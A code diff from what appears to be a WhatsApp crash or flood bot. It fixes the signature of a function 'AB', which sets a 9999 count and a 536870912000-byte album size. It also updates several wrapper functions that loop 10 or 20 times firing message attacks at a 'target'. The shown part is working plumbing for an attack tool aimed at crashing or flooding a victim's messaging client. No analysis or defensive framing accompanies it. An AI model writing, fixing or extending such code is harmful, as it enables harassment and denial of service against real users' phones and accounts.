@@ -482,7 +482,7 @@ async function F(sock, target) {
 }
 
 // HIS FUNCTION
-async function AB(target, mention) {
+async function AB(sock, target, mention) {
     const phynxImage = "https://files.catbox.moe/kst7w4.jpg";
     const Amount = 9999;
     const sizeAlbum = "536870912000";
@@ -677,7 +677,7 @@ async function AB(target, mention) {
 
 async function BB(sock, target) {
     for (let i = 0; i < 20; i++) {
-        await AB(sock, target)
+        await AB(sock, target, true)
         await F(sock, target)
         B(sock, target)
         await B(sock, target)
@@ -685,7 +685,7 @@ async function BB(sock, target) {
 }
 async function BB1(sock, target) {
     for (let i = 0; i < 20; i++) {
-        await AB(sock, target)
+        await AB(sock, target, true)
         await F(sock, target)
         B1(sock, target)
         await B1(sock, target)
@@ -693,7 +693,7 @@ async function BB1(sock, target) {
 }
 async function BG2(sock, target) {
     for (let i = 0; i < 20; i++) {
-        await AB(sock, target)
+        await AB(sock, target, true)
         await F(sock, target)
         G2(sock, target)
         await G2(sock, target)
@@ -709,7 +709,7 @@ async function BH3(sock, target) {
 }
 async function sikat(sock, target) {
     for (let i = 0; i < 10; i++) {
-        await AB(sock, target)
+        await AB(sock, target, true)
         await F(sock, target)
         B(sock, target)
         await B(sock, target)
